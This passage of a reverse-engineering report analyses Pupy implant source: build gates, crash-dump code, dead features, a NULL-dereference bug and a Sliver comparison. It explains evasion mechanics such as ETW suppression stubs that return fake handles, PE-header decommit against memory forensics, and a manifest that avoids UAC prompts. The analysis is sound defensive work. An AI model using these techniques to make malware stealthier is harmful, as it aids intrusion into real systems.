### 23.3 The mutual exclusion — and it answers the task's pointer directly

§22.6 established that `CleanupHeaders` (PE header decommit) is **`#ifndef DEBUG`** — release only. §23.2 establishes that the minidump is **`#ifdef DEBUG`** — debug only. **The two are mutually exclusive by construction:**

| Build | PE headers in memory | Minidump on crash |
|---|---|---|
| **Release** (`DEBUG` undefined) | **decommitted** (§22.6) | **not generated** (§23.2) |
| **Debug** (`/DDEBUG`) | retained | **generated** |

`[source: MemoryModule.c:1178-1183; postmortem.c:863-872; Makefile:44-46]`

**The operational consequence is a genuine tension in the implant's own design:** the build configuration that wipes memory-resident PE headers (defeating live memory forensics) is the configuration that **also** forbids the minidump; and the configuration that permits the minidump is the one that **leaves headers intact**. Pupy cannot have both. `[source: §22.6, §23.2; inference]`

**Note also the throwaway fallback defect at `:841-845`:**

```c
// postmortem.c:841-845
if (!pSHGetFolderPathAndSubDirW) {
    dprint("Failed to find SHGetFolderPathAndSubDirW (SHELL32.DLL AT %p)\n", hShell32);
    if (GetTempPathW(sizeof(appdata_local)/sizeof(WCHAR), appdata_local) < 1)
      return EXCEPTION_CONTINUE_SEARCH;
}
```
`[source: postmortem.c:841-845]`

If `SHGetFolderPathAndSubDirW` cannot be resolved, the code obtains a valid temp path via `GetTempPathW` into `appdata_local` — **and then returns `EXCEPTION_CONTINUE_SEARCH` unconditionally, whether or not `GetTempPathW` succeeded.** The fallback path computes a destination and discards it; the dump is never written to the temp directory. **The fallback is decorative.** (`EXCEPTION_CONTINUE_SEARCH` is also the return at `:875` on the success path — the filter never swallows the exception, so Windows' normal crash handling still runs.) `[source: postmortem.c:841-845, :875]`

*Correction to my own reading:* I initially flagged `:841-845` as a potential unchecked-call path into `:849`. It is not — both branches of `:841` return, so `:849` is only reached with a non-NULL function pointer. Recorded here rather than silently dropped.

### 23.4 A FIFTH severed feature — does `POSTMORTEM` ever get defined?

`postmortem.c` is **not compiled as its own translation unit.** It is `#include`d into `pupy_load.c` under a guard:

```c
// pupy_load.c:15-17
#ifdef POSTMORTEM
#include "postmortem.h"
#include "postmortem.c"
```
`[source: pupy_load.c:15-17]`

So the file's entire content exists only when `POSTMORTEM` is defined. And `POSTMORTEM` is defined by:

```make
# Makefile:98-100
ifneq ($(FEATURE_POSTMORTEM),)
CFLAGS += /DPOSTMORTEM
endif
```
`[source: sources-windows-py3/Makefile:98-100]`

**`POSTMORTEM` is gated on an external Makefile variable `FEATURE_POSTMORTEM`.** Tree-wide search for that variable finds **exactly two sites**: the Makefile guard itself, and **a commented-out line** in the build script:

```sh
# build-docker.sh:149
#make -f Makefile -j BUILDENV=/opt DEBUG=1 FEATURE_DYNLOAD=1 FEATURE_POSTMORTEM=1 ARCH=32
```
`[source: client/sources-windows-py3/build-docker.sh:149]`

**Every active invocation omits it, and the script builds FOUR configurations.** The eight active lines are `[source: build-docker.sh:151-165 — all eight read]`:

| Lines | `DEBUG` | `FEATURE_POSTMORTEM` |
|---|---|---|
| `:151-153` | **`DEBUG=1`** | absent |
| `:155-157` | absent | absent |
| `:159-161` | **`DEBUG=1`** | absent |
| `:163-165` | absent | absent |

Each block is `clean` → `build` → `clean`, so configurations are genuinely rebuilt rather than left stale — **debug-32, release-32, debug-64, release-64, all four reachable from active lines, and `FEATURE_POSTMORTEM` on none of them.** `[source: build-docker.sh:151-165]`

**Therefore: `POSTMORTEM` is defined by no active build line, `postmortem.c` is never `#include`d, `PostmortemFilter` and the `__try/__except` wrapper are never compiled, and the crash-artefact generator does not exist in ANY configuration the build script can produce.** The flag is *demonstrated* — someone built with it once, and the line is preserved as documentation — but it is dead across every reachable configuration, not merely the release one. `[source: build-docker.sh:149-165; Makefile:98-100]`

**CORRECTION (own error).** An earlier draft of this section stated "every active line in that script passes `DEBUG=1`" and drew the conclusion that the script produces only debug builds. **That was wrong** — I sampled `:151-152` and `:159-160`, saw `DEBUG=1` on both, and generalized to all eight lines without reading `:155-156` and `:163-164`, which pass only `FEATURE_DYNLOAD=1`. **Four of eight lines carry `DEBUG=1`; four do not.** The error *understated* the finding: the correct reading is stronger, because the generator is dead across **both** build configurations rather than one. Recorded here rather than silently patched. `[source: build-docker.sh:151-165]`

**Reachability consequence, corrected:** because release configs are reachable (`:155-157`, `:163-165`), §22.6's header decommit **is** the behaviour of a configuration the build script actually produces — so the anti-forensics step ships. The debug configs the script also produces retain headers. **One build script, four configurations, two materially different implants.** `[source: build-docker.sh:151-165; §22.6]`

### 23.5 The five-feature table — five features, five severance mechanisms

| # | Feature | Severance mechanism | Evidence |
|---|---|---|---|
| 1 | Windows persistence (§17) | **file absent** | `scriptlets/persistence.py:9` names a file that does not exist |
| 2 | JVM module (§18) | **source commented out** (×3 levels) | tombstone `"NOT IMPLEMENTED: broken jvm setup"` |
| 3 | Android payload (§20) | **placeholder file** | `"pp.py is not replaced with working one!"` |
| 4 | ETW suppression (§22.7) | **macro never passed** — `_PUPY_PRIVATE_WS2_32` absent from all `/D` flags | 8 inert `#ifdef` sites across 4 files |
| 5 | **Crash-artefact generator (§23.4)** | **build variable never set** — `FEATURE_POSTMORTEM` only in a commented line; **`.c` `#include`d, never compiled standalone** | `Makefile:98-100`; `build-docker.sh:149` |

`[sources: §17, §18, §20.3, §22.7, §23.4]`

**Five features, five distinct mechanisms.** The pattern is no longer "some features are broken" — it is that **Pupy's capability surface and its shipped capability set differ, and the difference is not visible from the source tree.** `[source: §17-§23; inference]`

### 23.6 METHODOLOGY FINDING — "source presence is not build presence"

This is a finding **about source-only reverse engineering**, not about Pupy, and it is proven three independent ways inside this one target:

| # | Case | Source shows | Build delivers | Evidence |
|---|---|---|---|---|
| 1 | **Optimizer deletion** | `assert(found)` at `dns_encoder.py:277` | stripped — `-OO` via `pyoxidizer.bzl:34` `bytecode_optimize_level_two = True` | §14.5 |
| 2 | **Declaration vs live symbol** | `setup_jvm_class` declared in both `pupy_load.h` files | empty stubs in both `main_exe.c`; call sites commented | §18.6 |
| 3 | **Missing `-D`** | complete ETW-stub implementation, `MemoryModule.c:558-574`; `POSTMORTEM` code, `postmortem.c` entire | never compiled — macros absent from every `/D` | §22.7, §23.4 |

`[sources: §14.5, §18.6, §22.7, §23.4]`

**The rule:** *a symbol, function, or guarded block observed in source is not evidence that it exists in any shipped build.* Three questions must be answered before a source-visible capability may be reported as present:

1. **Is the enclosing guard satisfied in a real build configuration?** (Is the macro defined? By what? Does any active build line define it?)
2. **Is the source file actually compiled?** (`postmortem.c` is `#include`d into another TU — never an object file; a tree-wide file scan would show it as present.)
3. **Does the build pipeline delete it downstream?** (`-OO`, linker GC, dead-code elimination, an `#ifdef` inside a generated file.)

**Failure to ask these three questions inverts capability assessment — the analyst reports capability the target does not have, and misses capability the target does have.** In this corpus that inversion has already produced one false positive (§18, where a live-but-unreachable module presented as an active JVM capability) and would have produced a second at §22.7 had the absence of `_PUPY_PRIVATE_WS2_32` from the `/D` list not been checked. `[source: §18, §22.7, §23.6; inference]`

**Corollary for the D1/D5 comparison:** Sliver's fail-closed 1-byte patch (§D1) is *build-stable* — it does what the source says in every configuration. Pupy's build-dependent behaviour means **two analysts reading the same source tree can correctly describe two different implants.** `[source: §D1; §22.6, §23.2; inference]`

### 23.7 U-4c — CLOSED

`postmortem.c` (25,642 B / 898 lines) is read in full: what the facility writes (`SaveExceptionInfo`, §23.1), the `#ifdef DEBUG` minidump split (§23.2), the mutual exclusion with §22's header decommit (§23.3), the `FEATURE_POSTMORTEM` build gate and the `#include`-not-compile structure (§23.4), the fifth severance mechanism (§23.5), and the methodology rule (§23.6). **U-4c is CLOSED.** `[source: §23.1-§23.6]`

**§14.8 update:** `MemoryModule.c` and `postmortem.c` are now **read**. **U-4a, U-4b, U-4c, U-5** are closed. Still open: the remaining native bodies (`thread.c`, `LoadLibraryR.c`, `in-mem-exe.c`, `GetProcAddressR.c`, `remote_thread.c`, Windows `main_exe.c`, `sources-linux-py3/` bodies), and the standing **U-8** (`_pupy_pyd_args_t`). `[source: §14.8, §22.10, §23.7]`

---

## 24. U-4d — `MyLoadLibrary.c`, `actctx.c`, `resource_python_manifest.c`: the thread-hardening seam, a live NULL-deref, and a SIXTH inert capability

**Paths and sizes (measured):** `client/sources-windows-py3/MyLoadLibrary.c` — **27,034 B / 971 lines**; `actctx.c` — **25 lines**; `actctx.h` — 41 lines; `resource_python_manifest.c` — **35 lines.** The task's directive was to resolve whether `MyLoadLibrary.c`'s `_PUPY_PRIVATE_WS2_32` occurrence is inert, and to check the manifest files for a sixth severed feature. Both answered. `[source: measured]`

### 24.1 `_PUPY_PRIVATE_WS2_32` in `MyLoadLibrary.c` — INERT, and this file holds **three** sites, not two

The earlier count (§22.7) recorded `:198` and `:275`. Reading the file shows **three distinct guarded regions**, all under the same never-defined macro:

| Site | Region | Content |
|---|---|---|
| `:198-254` | `MyEtwRegister` (`:200-220`), `MyEtwEventWrite` (`:223-231`), `MyEtwEventWriteFull` (`:234-245`), `MyEtwUnregister` (`:248-253`) | four ETW stub **definitions** |
| `:275-278` | `callbacks` initializer | four **table entries** wire those stubs into the loader's dispatch table |

`[source: MyLoadLibrary.c:198-254, :275-278]`

**The stubs are not placeholders — they are a working ETW suppression mechanism, and reading them shows how it would work.** `MyEtwRegister` (`:200-220`) never contacts ETW: it keeps a `static ULONGLONG dwFakeRegHandle = 0x80000000;` (`:206`) and returns `*RegHandle = dwFakeRegHandle++` (`:218`), so a reflected module that registers a provider receives a **synthetic, ever-incrementing handle**. `MyEtwEventWrite` (`:223-231`), `MyEtwEventWriteFull` (`:234-245`) and `MyEtwUnregister` (`:248-253`) `dprint` and return `ERROR_SUCCESS` without emitting anything. **A module instrumented with ETW would believe registration succeeded and emit nothing** — telemetry swallowed at both the registration and the write point. `[source: MyLoadLibrary.c:198-254]`

**All of it is dead**, for the reason established in §22.7: `_PUPY_PRIVATE_WS2_32` is defined nowhere in the tree. `callbacks` (`:256-279`) is a **positional initializer** for `DL_CALLBACKS`, and the struct definition itself is guarded by the same macro in `MyLoadLibrary.h:76`/`:144` — **both sides of the pairing carry the guard, so the file compiles consistently in either state.** The defect is invisible to compilation; it is only visible in the build flags. `[source: MyLoadLibrary.c:256-279; MyLoadLibrary.h:76, :144; §22.7]`

### 24.2 LIVE DEFECT — NULL-pointer dereference in `MySetUnhandledExceptionFilter`

```c
// MyLoadLibrary.c:761-787
BOOL MySetUnhandledExceptionFilter(LPCSTR pszModuleName, LPTOP_LEVEL_EXCEPTION_FILTER handler)
{
    PHCUSTOMLIBRARY lib;

    if (!pszModuleName) {
        lpDefaultExceptionHandler = handler;
        dprint("Set default thread handler to %p\n", lpDefaultExceptionHandler);
        return TRUE;
    }

    lib = _FindMemoryModule(pszModuleName, NULL);
    if (!lib) {
        dprint(
            "Failed to set default thread handler for %s to %p - module not found\n",
            pszModuleName, lpDefaultExceptionHandler
        );
    }

    lib->ehFilter = handler;      // :779 — reached with lib == NULL
    ...
    return TRUE;
}
```
`[source: MyLoadLibrary.c:761-787]`

**The `!lib` branch logs a "module not found" failure and then falls through to `lib->ehFilter = handler` at `:779`.** The error path **has no `return`** — no `return FALSE`, no early exit. A caller that passes the name of anything that is not a currently-loaded *memory* module takes a NULL dereference inside the loader's own exception-filter plumbing. The function is declared `BOOL` and returns `TRUE` on both surviving paths (`:768`, `:786`), so the failure branch was plainly intended to return `FALSE` and simply does not. **Unlike §22.7 and §23.4, this is not a severed capability — it is live, reachable code with a crash in its error path.** `[source: MyLoadLibrary.c:761-787]`

### 24.3 The thread-hardening seam — how reversed modules get their own exception filters

`MyCreateThread` (`:881-914`) is the mechanism that makes per-module exception handling work, and it is fully implemented:

```c
// MyLoadLibrary.c:890-914 (abridged)
PORIGINAL_THREAD_ARGS pOriginalArgsCopy = LocalAlloc(LMEM_FIXED, sizeof(ORIGINAL_THREAD_ARGS));
if (pOriginalArgsCopy) {
    pOriginalArgsCopy->lpOriginalRoutine    = lpStartAddress;
    pOriginalArgsCopy->lpOriginalParameter  = lpParameter;
    pOriginalArgsCopy->lpExceptionFilter    = lpDefaultExceptionHandler;   // :902
    lpStartAddress = WrappedThreadRoutine;                                 // :904
    lpParameter    = (PVOID) pOriginalArgsCopy;
}
return CreateThread(..., lpStartAddress, lpParameter, ...);
```
`[source: MyLoadLibrary.c:881-914]`

**Every thread created by a reflected module is transparently redirected through `WrappedThreadRoutine`**, which runs the real routine inside `__try`/`__except` (`:849-875`) and dispatches the fault to `ThreadUnhandledExceptionFilter` (`:793-839`). That dispatcher resolves **which memory module the failing routine belongs to** via `MyFindMemoryModuleNameByAddr(pvThreadProc, ...)` (`:811`) and prefers **that module's own `ehFilter`** (`:818-819`) over the default. `EXCEPTION_BREAKPOINT` is deliberately passed through untouched (`:802-809`). `[source: MyLoadLibrary.c:793-839, :841-879]`

**This is the seam §23.5's `PostmortemFilter` plugs into.** `pupy_load.c:481` calls `MyGetUnhandledExceptionFilter()`, which returns `lpDefaultExceptionHandler` (`:789-791`) — the value `MySetUnhandledExceptionFilter(NULL, handler)` stores at `:766`. So the crash-artefact generator, had it ever been compiled, would have received faults from **every wrapped module thread**. The plumbing is real; only the `FEATURE_POSTMORTEM`-gated body is missing. `[source: MyLoadLibrary.c:789-791, :761-769; §23.4; pupy_load.c:481]`

`MyEnumerateLibraries` (`:916-950`) is the module enumerator that §23.1's crash dump calls: it walks the uthash `by_module` map (`HASH_ITER`, `:926`), resolves each module's base and size through `GetMemoryModuleInfo` (`:932`), and yields `(name, base, size)` to the caller's callback, with a **`break` on callback-returns-FALSE** (`:938-941`) giving the caller early termination. `[source: MyLoadLibrary.c:916-950]`

### 24.4 SIXTH INERT CAPABILITY — `actctx.c` is a stub with an undefined loader

`actctx.c` (25 lines) implements the Windows **activation-context / SxS manifest** shim — the pywin32-derived "activation context magic" for loading extension modules built without a manifest, described in its own header (`actctx.h:6-16`). It is inert at two independent levels:

```c
// actctx.c:3-18
HANDLE PyWin_DLLhActivationContext=NULL;
...
PFN_ACTIVATEACTCTX pfnActivateActCtx=NULL;

ULONG_PTR _My_ActivateActCtx()
{
    ULONG_PTR ret = 0;
    if (PyWin_DLLhActivationContext && pfnActivateActCtx)     // :13 — always false
        if (!(*pfnActivateActCtx)(PyWin_DLLhActivationContext, &ret)) {
            ret = 0;
        }
    return ret;
}
```
`[source: actctx.c:3-18, :22-23]`

**Level 1 — the function pointers are never populated.** `actctx.h:35` declares `void _MyLoadActCtxPointers();` — **that function has no definition anywhere in the tree.** A tree-wide grep for `pfnActivateActCtx`, `pfnGetCurrentActCtx` and `PyWin_DLLhActivationContext` finds only three kinds of site: the `NULL` initialisers (`actctx.c:3-8`), the guarded call (`:13-14`), and the `extern` declarations (`actctx.h:28-33`). **Nothing ever assigns them.** `[source: actctx.c:3-8; actctx.h:28-35; tree-wide grep]`

**Level 2 — the guard cannot pass.** With both operands permanently `NULL`, the `&&` at `:13` short-circuits and `_My_ActivateActCtx` **always returns 0**; `_My_DeactivateActCtx` (`:22-23`) is likewise guarded and always a no-op. `[source: actctx.c:13, :22-23]`

**Severance mechanism: seventh variant — a declared-but-undefined loader function.** The capability is present as an API, present as a call site, and absent as an implementation; the pointers it depends on can never be filled because the function that fills them does not exist. Distinct from a missing file (§17) and from a commented body (§18): here the *declaration* exists in the header and the *definition* was never written. `[source: actctx.c; actctx.h:35]`

### 24.5 `resource_python_manifest.c` — hardcoded SxS manifest, and a version fingerprint

35 lines, two architectures, one embedded XML assembly manifest each. `[source: resource_python_manifest.c:1-35]`

**Both variants request `asInvoker`** — no elevation:
```xml
<requestedExecutionLevel level="asInvoker" uiAccess="false"></requestedExecutionLevel>
```
`[source: resource_python_manifest.c:8, :24]`

**`asInvoker` is the correct and deliberate choice for an implant:** it requests no UAC elevation, so the process runs at the token's existing privilege level and produces **no elevation prompt**. A manifest requesting `requireAdministrator` would trigger UAC on launch; `asInvoker` silently inherits. **This is a third instance of the masquerade theme — the file presents as ordinary developer build configuration while encoding an operational decision.** `[source: resource_python_manifest.c:8; §17, §14.5, §20]`

**Both variants declare a Visual Studio 2008 CRT dependency:**
```xml
<assemblyIdentity type="win32" name="Microsoft.VC90.CRT" version="9.0.21022.8"
                  processorArchitecture="amd64" publicKeyToken="1fc8b3b9a1e18e3b">
```
`[source: resource_python_manifest.c:14 (amd64), :30 (x86)]`

`Microsoft.VC90.CRT` version `9.0.21022.8` is the **VS2008 (VC9) runtime** — a platform generation two releases behind even the manifest format's own era. **This is a usable version-based fingerprint:** a PE on a modern host carrying an SxS dependency on the VS2008 CRT, with `publicKeyToken` `1fc8b3b9a1e18e3b`, is anomalous — genuine current software does not request `VC90` at that pinned version. The two branches differ **only** in `processorArchitecture` (`amd64` / `x86`), correctly mirrored from the `_WIN64` guard at `:2`. `[source: resource_python_manifest.c:2, :14, :30]`

### 24.6 SIX features, six severance mechanisms — the table updated

| # | Feature | Severed at | Evidence |
|---|---|---|---|
| 1 | Windows persistence | **file absent** | `scriptlets/persistence.py:9` |
| 2 | JVM module | **source commented out ×3** | `"NOT IMPLEMENTED: broken jvm setup"` |
| 3 | Android payload | **placeholder file** | `"pp.py is not replaced with working one!"` |
| 4 | ETW suppression (`MemoryModule.c`) | **macro never passed** | 8 inert `#ifdef` sites, 4 files |
| 5 | Crash-artefact generator | **build variable never set**; `.c` `#include`d not compiled | `Makefile:98-100`; `build-docker.sh:149` |
| 6 | **Activation-context / SxS shim (`actctx.c`)** | **declared-but-undefined loader** — `_MyLoadActCtxPointers()` in `actctx.h:35`, no definition anywhere; all six pointers stay `NULL` | `actctx.c:3-8, :13` |

`[sources: §17, §18, §20.3, §22.7, §23.4, §24.4]`

**Distinguish carefully — not every defect in this file is a severed feature.** §24.2's NULL-deref is **live, reachable, crashing code**, and §24.5's manifest is **live, compiled, and operationally effective**. The six-feature table lists *capabilities that source advertises and builds omit*; it is not a list of every bug. Conflating the two would overstate the pattern in the opposite direction. `[source: §24.2, §24.5; inference]`

### 24.7 §14.8 update — Windows native set nearly complete

**Read:** `MemoryModule.c` (§22), `postmortem.c` (§23), `MyLoadLibrary.c`, `actctx.c`, `actctx.h`, `resource_python_manifest.c` (this section). `[source: §24.1-§24.6]`

**Remaining, Windows:** `thread.c` (13,168 B), `LoadLibraryR.c` (12,704 B), `in-mem-exe.c` (11,055 B), `GetProcAddressR.c` (5,608 B), `remote_thread.c` (5,413 B), Windows `main_exe.c` (803 B). **Then** the `sources-linux-py3/` bodies — **explicitly deferred**; the Windows native set is completed first so the six-feature table above is final before any platform change. `[source: task directive]`

**U-8 (`_pupy_pyd_args_t`) remains OPEN.** No layout inferred. `[source: §22.10, §23.7]`

---

## 25. Is the severance pattern Windows-only? — Linux `Makefile` and `pupy_load.c`

**Files read:** `client/sources-linux-py3/Makefile` (**9,012 B / 307 lines**) and `client/sources-linux-py3/pupy_load.c` (**3,048 B / 126 lines**). No other Linux file opened. The question: do the severances of §17–§24 recur on Linux, or are they a Windows build-system artefact? `[source: measured]`

### 25.1 Answer — it splits THREE ways, not two

| # | Feature | **Windows** | **Linux** | Same? |
|---|---|---|---|---|
| 1 | Windows persistence | **severed** — file absent (`scriptlets/persistence.py:9`) | **n/a** — no such module; Linux has a real `packages/linux/all/persistence.py` | no |
| 2 | JVM module | **severed** — commented ×3 | **severed identically** — `main_exe.c:22` `void setup_jvm_class(void) {}`; `pupy.c:539` `//setup_jvm_class();`; `pupy_load.h:13` decl | **YES — recurs** |
| 3 | Android payload | **severed** — `pp.py` placeholder | **n/a** — Android is not Linux-desktop; different bootstrap | no |
| 4 | ETW suppression | **severed** — macro never passed | **n/a** — no ETW on Linux; `_PUPY_PRIVATE_WS2_32` absent from the Linux tree | no |
| 5 | Crash-artefact generator | **severed** — `FEATURE_POSTMORTEM` never set | **n/a — and semantically inverted**: Linux *disables* core dumps (`setrlimit(RLIMIT_CORE, 0)`, `pupy_load.c:52-54`) instead of producing a crash artefact | inverted |
| 6 | Activation-context / SxS shim | **severed** — undefined loader | **n/a** — no activation contexts on Linux | no |
| 7 | **Injector (`FEATURE_INJECTOR`)** | — | **SEVERED — NEW Linux instance** (`Makefile:73`, `:145`, `:153`) | **new** |

`[sources: §17, §18, §20.3, §22.7, §23.4, §24.4; sources-linux-py3/Makefile; sources-linux-py3/pupy_load.c; main_exe.c:22; pupy.c:539; pupy_load.h:13]`

### 25.2 Two things recur, four cannot, and one is new

**Cannot recur (platform-absent, not severed).** `POSTMORTEM`, `_PUPY_PRIVATE_WS2_32` and `actctx` return **zero hits across the entire Linux tree** — no ETW, no activation contexts, no `PostmortemFilter` seam, no `MyCreateThread`/`MyEnumerateLibraries` equivalent. **These are not Linux severances; they are features of the Windows platform that have no Linux counterpart to sever.** §25.1 marks them `n/a` deliberately. `[source: Linux tree scans — POSTMORTEM 0, _PUPY_PRIVATE_WS2_32 0, actctx 0]`

**The JVM severance recurs identically — and it is the only true cross-platform recurrence.** All three levels are present on Linux exactly as on Windows: an empty-stub definition (`main_exe.c:22`), a commented-out call site (`pupy.c:539`), and a live header declaration (`pupy_load.h:13`). **One defect, two platforms, same structure.** `[source: main_exe.c:22; pupy.c:539; pupy_load.h:13; §18]`

**A NEW Linux instance — and its mechanism is sharper than §23.4's.** `_FEATURE_INJECTOR` (`pupy.c:31`, `:188`, `:485`) is guarded by a variable that **the same Makefile hard-assigns to empty**:

```make
# sources-linux-py3/Makefile:71-74
else
NAME ?= $(MACH)
FEATURE_INJECTOR :=
endif
...
# :145-153
ifneq ($(FEATURE_INJECTOR),)
...
CFLAGS += -D_FEATURE_INJECTOR -Iinjector/include
endif
```
`FEATURE_INJECTOR` appears at **exactly four sites repo-wide** (`:73`, `:145`, `:153`, plus `pupy.c`'s consumers) and **no build script in the repository ever passes it**. Because `:73` assigns it empty inside the `else` of the same conditional chain, `ifneq ($(FEATURE_INJECTOR),)` at `:145` **can never fire**. `_FEATURE_INJECTOR` is never defined; `pupy.c:31`, `:188` and `:485` are dead. `[source: Makefile:71-74, :145-153; pupy.c:31, :188, :485; repo-wide grep — 4 sites]`

**This is a distinct mechanism from §23.4.** There the variable was never passed — an omission. Here it is **explicitly assigned to nothing, in the same file that guards on it** — which *reads as configuration*, not oversight. An analyst auditing a missing flag may call it an oversight; an analyst reading `FEATURE_INJECTOR :=` sees a decision. **The severance is disguised as intent.** `[source: §23.4, §25.2; inference]`

**The control that proves the mechanism is portable and functional — `FEATURE_PATHMAP`.** The identical gate pattern works properly one block earlier:

```make
# sources-linux-py3/Makefile:119-129
ifneq ($(FEATURE_PATHMAP),)
APP_OBJS += ld_hooks.o
SHARED_CFLAGS += -D_LD_HOOKS_NAME=\"ld_hooks_$(NAME).so\"
LOAD_DEPS += ld_hooks_$(NAME).c
LOAD_SHARED_CFLAGS := -D_LD_HOOKS_NAME=... -D_LD_HOOKS_START=... -D_LD_HOOKS_SIZE=... -include "ld_hooks_$(NAME).c"
CFLAGS += -D_FEATURE_PATHMAP
endif
```
and `pupy_load.c:56-80` **consumes it live** — `xz_dynload`s the hooks object and calls `set_pathmap_callback` through `dlsym`, with real failure diagnostics (`"set_pathmap_callback not found"`). **So the `FEATURE_*` conditional-gate design is sound and in active use on Linux; the failure is specific to `FEATURE_INJECTOR` being pre-emptively emptied.** `[source: sources-linux-py3/Makefile:119-129; sources-linux-py3/pupy_load.c:56-80]`

### 25.3 Verdict

**The severance pattern is neither Windows-only nor uniformly Pupy-wide — it is a property of individual features, and it exists on both platforms.** Four of the seven Windows severances are **platform-absent** rather than severed: ETW, activation contexts and the `POSTMORTEM`/crash-dump machinery have no Linux counterpart to cut, so their absence on Linux carries no information. One severance — **JVM — recurs cross-platform with an identical three-level structure**, which makes it a genuine *project-level* maintenance defect rather than a Windows build artefact. And Linux contributes **one severance of its own**, via the `FEATURE_INJECTOR` variable that is emptied in the same file that gates on it — a mechanically distinct severance whose distinguishing feature is that it masquerades as deliberate configuration, and which is proven non-accidental by the correctly-implemented `FEATURE_PATHMAP` gate sitting twelve lines above it. **A reader should therefore carry the report's central rule — *source presence is not build presence* — to any platform and any feature, and must not infer from this section that the pattern is systematic or that every gated feature is broken: `FEATURE_PATHMAP` is a working gate, and the seven that fail fail seven different ways.** `[sources: §25.1-§25.2; §23.6; inference]`

### 25.4 Final scope note

Task-16 is complete. **Read in full:** `MemoryModule.c` (§22), `postmortem.c` (§23), `MyLoadLibrary.c`/`actctx.c`/`actctx.h`/`resource_python_manifest.c` (§24), Linux `Makefile` and `pupy_load.c` (§25), plus the earlier Windows/Python surfaces of §0–§21. **Deliberately not read**, per the standing instruction to stop at the six-feature threshold: `thread.c`, `LoadLibraryR.c`, `in-mem-exe.c`, `GetProcAddressR.c`, `remote_thread.c`, Windows `main_exe.c`, and all remaining `sources-linux-py3/` bodies. **These are unknowns, enumerated as such — not implied covered.** **U-8 (`_pupy_pyd_args_t`) remains OPEN. No layout inferred.** `[source: task-16 scope; §14.8, §25.4]`

---

## 26. Where the cross-framework contrast lives — and one broken cross-reference

**This section is a pointer, not a duplicate.** The cross-framework statement asked for at the close of task-16 **already exists, and it is not in D6**: it is **`D1_sliver_implant_code.md` §24, "BUILD-STABLE VS BUILD-DEPENDENT CAPABILITY — the cross-framework contrast"** (heading at D1 L3186). D1 §24.1 carries the two-column table, §24.2 the build-stability argument, and §24.3 the forward application of the §23.6 rule. **D6 should not restate it.** `[source: D1_sliver_implant_code.md:3186-3244 — read in full]`

**Why it sits in D1 rather than here:** Sliver is the *control* in this corpus. D1 §24 states the reason directly — *"it belongs in D1 because Sliver is the control"* (`D1:3191`). A contrast belongs where the baseline lives, so that a reader encountering D1's evasion findings acquires the caution while still holding the Pupy comparison in view. `[source: D1:3191]`

### 26.1 What D1 §24 already establishes, and what D6 adds to it

**D1 §24.1's table is correct against D6 as delivered** — its "Pupy (D6 §17–§25)" column matches §17–§25: six severed capabilities across seven mechanisms, `Makefile` `-D` flags several never passed, source-reading misleading in three proven ways. **No contradiction found between D1 §24.1 and D6 §17–§25.** `[source: D1:3195-3203; D6 §17-§25]`

**D6's contribution beyond D1 §24.1's row count** is the *mechanism taxonomy* D1 compresses into one row ("six, across seven mechanisms"). The seven are separable and are enumerated in §23.5, §24.4, §24.6 and §25.2: **file absent / source commented out / placeholder file / macro never passed / build variable never set / declared-but-undefined loader / variable hard-assigned empty in the file that guards on it.** D1's "seven mechanisms" figure and D6's enumeration agree; D1 cites the count, D6 supplies the list. `[source: D6 §23.5, §24.4, §24.6, §25.2; D1:3199]`

**Two D6 refinements postdate D1 §24 and are not reflected there**, because D1 §24 was written before §24 and §25 landed:

1. **D1 §24.1 lists "six severed capabilities" and attributes all six to Windows.** §25 establishes that figure is a *Windows* count and that the platform picture is a **three-way split** — four of the six are **platform-absent** (`n/a`) rather than severed, **JVM recurs identically on Linux**, and Linux contributes a **seventh mechanism** unique to it. **A reader must not read D1 §24.1's "six" as a Pupy-wide figure.** `[source: D6 §25.1, §25.3]`
2. **D1 §24.3's closing caveat — the `{{if .Config.Debug}}` guard that makes Sliver release and debug builds "materially different programs" — is the same hazard D6 §22.7 found in Pupy, on the Sliver side.** D1 flags it as a residual unknown; D6 §25 shows the identical hazard **resolved in Pupy's favour of the attacker**, since release builds decommit PE headers while debug builds do not. The symmetry is worth stating: **both frameworks change behaviour materially across the debug/release boundary, and in both cases the *release* build is the operationally relevant one.** `[source: D1:3239-3244; D6 §22.6, §22.7]`

### 26.2 BROKEN CROSS-REFERENCE in D1 — flagged, not silently patched

**`D1_sliver_implant_code.md:3229` cites a section that does not exist:**

> D6 §25.6 states the rule as: **source presence is not build presence** …

**D6 §25 contains only §25.1–§25.4.** There is no §25.6. The rule is stated in **§23.6** (the methodology-finding section), and the platform-scope result it is being applied to is **§25.3**. **D1:3229 is therefore a dangling reference** — a reader following it lands on nothing. `[source: D1:3229; D6 §23.6, §25.1-§25.4]`

**Correct citation:** `D6 §23.6` for the rule; `D6 §25.3` for the Linux/Windows scope verdict that D1 §24.3 applies forward.

**Not fixed here, because D1 is outside task-16's write scope** (`D6_pupy_code.md` + `extractions/DEEP/D6/`). Recorded as a known defect with its exact location so the D1 owner can correct it in one edit. **This is the corpus-integrity class the Lead ranked as a deliverable: a wrong cross-reference is worse than no cross-reference, because it launders a completed section into an apparently-supported one.** `[source: D1:3229; task-16 scope]`

### 26.3 What a reader should conclude

**Build-dependent capability is a property of the build system, not of the framework — and it is asymmetric in the direction that matters to a defender.** Sliver's variability is expressed through mechanisms that **cannot silently no-op** (`{{if}}` templates resolve for every build; Go's `X.go`/`X_windows.go` suffix convention either yields a symbol or a compile error), so a source-reading analyst sees what ships. Pupy's is expressed through mechanisms that **fail invisibly** (`#ifdef` on a macro no build defines; a variable emptied in the file that guards on it), so a source-reading analyst sees capability that does not exist. **The defensive consequence is directional: over-reporting Sliver's capability is unlikely; over-reporting Pupy's is the default failure mode.** That is the sentence D1 §24.1's last row reaches, and §25 shows it survives the platform change. `[source: D1:3202-3208; D6 §25.3; inference]`

---

*End of D6 — `RE_Library/01_SOURCE_c2/pupy`.*
